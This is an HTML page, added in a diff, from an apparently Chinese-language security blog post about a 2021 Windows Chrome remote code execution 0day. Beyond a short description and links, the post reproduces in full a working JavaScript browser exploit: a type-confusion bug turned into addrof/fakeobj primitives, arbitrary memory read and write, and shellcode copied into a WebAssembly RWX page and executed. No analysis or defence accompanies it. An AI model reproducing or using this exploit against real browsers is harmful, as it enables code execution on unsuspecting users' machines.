@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Chrom 远程命令执行漏洞漏洞描述Windows Chrome 0day  在 2021-4-13 被公开 漏洞影响 [!NOTE] Window Chrome 浏览器  漏洞复现Github： https:&#x2F;&#x2F;github.com&#x2F;r4j0x00&#x2F;exploits&#x2F;tree&#x2F;master&#x2F;chrome-0day 推特: https:&#x2F;&#x2F;twitter.com&#x2F;r4j0x00&#x2F;status&#x2F;13">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Chrome/Windows%20Chrome%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Chrom 远程命令执行漏洞漏洞描述Windows Chrome 0day  在 2021-4-13 被公开 漏洞影响 [!NOTE] Window Chrome 浏览器  漏洞复现Github： https:&#x2F;&#x2F;github.com&#x2F;r4j0x00&#x2F;exploits&#x2F;tree&#x2F;master&#x2F;chrome-0day 推特: https:&#x2F;&#x2F;twitter.com&#x2F;r4j0x00&#x2F;status&#x2F;13">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:54.022Z">
+<meta property="article:modified_time" content="2022-07-08T09:06:16.906Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Chrome/Windows Chrome 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Chrome/Windows%20Chrome%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.022Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Chrom-远程命令执行漏洞"><a href="#Chrom-远程命令执行漏洞" class="headerlink" title="Chrom 远程命令执行漏洞"></a>Chrom 远程命令执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Windows Chrome 0day  在 2021-4-13 被公开</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>Window Chrome 浏览器</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Github： <a target="_blank" rel="noopener" href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day">https://github.com/r4j0x00/exploits/tree/master/chrome-0day</a></p>
+<p>推特: <a target="_blank" rel="noopener" href="https://twitter.com/r4j0x00/status/1381643526010597380?s=12">https://twitter.com/r4j0x00/status/1381643526010597380?s=12</a></p>
+<p><strong>exp.html</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;exploit.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>exp.js</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">BSD 2-Clause License</span></span><br><span class="line"><span class="comment">Copyright (c) 2021, rajvardhan agarwal</span></span><br><span class="line"><span class="comment">All rights reserved.</span></span><br><span class="line"><span class="comment">Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment">modification, are permitted provided that the following conditions are met:</span></span><br><span class="line"><span class="comment">1. Redistributions of source code must retain the above copyright notice, this</span></span><br><span class="line"><span class="comment">   list of conditions and the following disclaimer.</span></span><br><span class="line"><span class="comment">2. Redistributions in binary form must reproduce the above copyright notice,</span></span><br><span class="line"><span class="comment">   this list of conditions and the following disclaimer in the documentation</span></span><br><span class="line"><span class="comment">   and/or other materials provided with the distribution.</span></span><br><span class="line"><span class="comment">THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &quot;AS IS&quot;</span></span><br><span class="line"><span class="comment">AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span></span><br><span class="line"><span class="comment">IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE</span></span><br><span class="line"><span class="comment">FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span></span><br><span class="line"><span class="comment">DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line"><span class="comment">SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER</span></span><br><span class="line"><span class="comment">CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,</span></span><br><span class="line"><span class="comment">OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE</span></span><br><span class="line"><span class="comment">OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>])</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"><span class="keyword">let</span> buf2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x150</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">BigInt</span>(u64_buf[<span class="number">0</span>]) + (<span class="title class_">BigInt</span>(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    u64_buf[<span class="number">0</span>] = <span class="title class_">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">    u64_buf[<span class="number">1</span>] = <span class="title class_">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _arr = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">	x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	x = <span class="title class_">Math</span>.<span class="title function_">abs</span>(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = <span class="title class_">Math</span>.<span class="title function_">max</span>(x, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x==-<span class="number">1</span>) x = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(x);</span><br><span class="line">	arr.<span class="title function_">shift</span>();</span><br><span class="line">	<span class="keyword">var</span> cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x3000</span>;++i)</span><br><span class="line">    <span class="title function_">foo</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="title function_">foo</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">var</span> arr = x[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> cor = x[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> idx = <span class="number">6</span>;</span><br><span class="line">arr[idx+<span class="number">10</span>] = <span class="number">0x4242</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">k</span>) &#123;</span><br><span class="line">    arr[idx+<span class="number">1</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftoi</span>(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">k</span>) &#123;</span><br><span class="line">    cor[<span class="number">0</span>] = <span class="title function_">itof</span>(k);</span><br><span class="line">    <span class="keyword">return</span> arr[idx+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_map = <span class="title function_">ftoi</span>(cor[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="title function_">itof</span>(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake = <span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(arr2) + <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbread</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = <span class="title function_">itof</span>((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span> (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbwrite</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = <span class="title function_">itof</span>((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = <span class="title function_">itof</span>(<span class="title class_">BigInt</span>(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy_shellcode</span>(<span class="params">addr, shellcode</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf2);</span><br><span class="line">    <span class="keyword">let</span> buf_addr = <span class="title function_">addrof</span>(buf2);</span><br><span class="line">    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">0x14n</span>;</span><br><span class="line">    <span class="title function_">arbwrite</span>(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        dataview.<span class="title function_">setUint32</span>(<span class="number">4</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title function_">ftoi</span>(<span class="title function_">arbread</span>(<span class="title function_">addrof</span>(wasm_instance) + <span class="number">0x68n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Address of rwx page: &quot;</span> + rwx_page_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">3833809148</span>,<span class="number">12642544</span>,<span class="number">1363214336</span>,<span class="number">1364348993</span>,<span class="number">3526445142</span>,<span class="number">1384859749</span>,<span class="number">1384859744</span>,<span class="number">1384859672</span>,<span class="number">1921730592</span>,<span class="number">3071232080</span>,<span class="number">827148874</span>,<span class="number">3224455369</span>,<span class="number">2086747308</span>,<span class="number">1092627458</span>,<span class="number">1091422657</span>,<span class="number">3991060737</span>,<span class="number">1213284690</span>,<span class="number">2334151307</span>,<span class="number">21511234</span>,<span class="number">2290125776</span>,<span class="number">1207959552</span>,<span class="number">1735704709</span>,<span class="number">1355809096</span>,<span class="number">1142442123</span>,<span class="number">1226850443</span>,<span class="number">1457770497</span>,<span class="number">1103757128</span>,<span class="number">1216885899</span>,<span class="number">827184641</span>,<span class="number">3224455369</span>,<span class="number">3384885676</span>,<span class="number">3238084877</span>,<span class="number">4051034168</span>,<span class="number">608961356</span>,<span class="number">3510191368</span>,<span class="number">1146673269</span>,<span class="number">1227112587</span>,<span class="number">1097256961</span>,<span class="number">1145572491</span>,<span class="number">1226588299</span>,<span class="number">2336346113</span>,<span class="number">21530628</span>,<span class="number">1096303056</span>,<span class="number">1515806296</span>,<span class="number">1497454657</span>,<span class="number">2202556993</span>,<span class="number">1379999980</span>,<span class="number">1096343807</span>,<span class="number">2336774745</span>,<span class="number">4283951378</span>,<span class="number">1214119935</span>,<span class="number">442</span>,<span class="number">0</span>,<span class="number">2374846464</span>,<span class="number">257</span>,<span class="number">2335291969</span>,<span class="number">3590293359</span>,<span class="number">2729832635</span>,<span class="number">2797224278</span>,<span class="number">4288527765</span>,<span class="number">3296938197</span>,<span class="number">2080783400</span>,<span class="number">3774578698</span>,<span class="number">1203438965</span>,<span class="number">1785688595</span>,<span class="number">2302761216</span>,<span class="number">1674969050</span>,<span class="number">778267745</span>,<span class="number">6649957</span>];</span><br><span class="line"><span class="title function_">copy_shellcode</span>(rwx_page_addr, shellcode);</span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>
+
+<p>![](/resource/Windows-Chrome-远程命令执行漏洞/media/1.png)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Chrome/Windows%20Chrome%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnaq003iy8v1d8eq9hp0" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Citrix/%EF%BC%88CVE-2019-19781%EF%BC%89Citrix%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/CatfishCMS/%EF%BC%88CNVD-2019-06255%EF%BC%89CatfishCMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
